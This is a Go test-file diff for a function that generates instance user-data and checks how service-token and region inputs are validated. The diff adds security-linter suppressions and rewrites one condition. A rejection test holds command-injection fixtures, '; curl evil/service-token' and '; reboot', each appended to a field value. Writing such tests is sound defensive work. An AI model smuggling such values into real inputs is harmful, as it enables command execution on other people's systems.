@@ -182,7 +182,7 @@ func TestGenerateRawCreatesAdminBeforePublishingPorts(t *testing.T) {
 	if loopback < 0 || create < 0 || open < 0 {
 		t.Fatalf("missing steps: loopback=%d create=%d open=%d", loopback, create, open)
 	}
-	if !(loopback < create && create < open) {
+	if loopback >= create || create >= open {
 		t.Errorf("order must be loopback bind (%d) < admin create (%d) < publish (%d)", loopback, create, open)
 	}
 }
@@ -206,7 +206,7 @@ func TestGenerateRawGeneratesSecretsOnInstance(t *testing.T) {
 	}
 }
 
-const testTokenParam = "/fabrica/horde/0123456789abcdef0123456789abcdef/service-token"
+const testTokenParam = "/fabrica/horde/0123456789abcdef0123456789abcdef/service-token" // #nosec G101 -- SSM parameter name fixture, not a credential
 
 func TestGenerateRawPublishesServiceTokenBeforePorts(t *testing.T) {
 	got, err := GenerateRaw(UserDataConfig{MongoPassword: "p", Port: 5000, ServiceTokenParameter: testTokenParam, Region: "us-west-2"})
@@ -262,7 +262,7 @@ func TestGenerateRawOmitsServiceTokenWithoutParameter(t *testing.T) {
 
 func TestGenerateRawRejectsUnsafeServiceTokenInputs(t *testing.T) {
 	for _, cfg := range []UserDataConfig{
-		{MongoPassword: "p", Port: 5000, ServiceTokenParameter: "/fabrica/horde/x; curl evil/service-token", Region: "us-west-2"},
+		{MongoPassword: "p", Port: 5000, ServiceTokenParameter: "/fabrica/horde/x; curl evil/service-token", Region: "us-west-2"}, // #nosec G101 -- injection fixture: the test asserts rejection
 		{MongoPassword: "p", Port: 5000, ServiceTokenParameter: testTokenParam, Region: ""},
 		{MongoPassword: "p", Port: 5000, ServiceTokenParameter: testTokenParam, Region: "us-west-2; reboot"},
 	} {
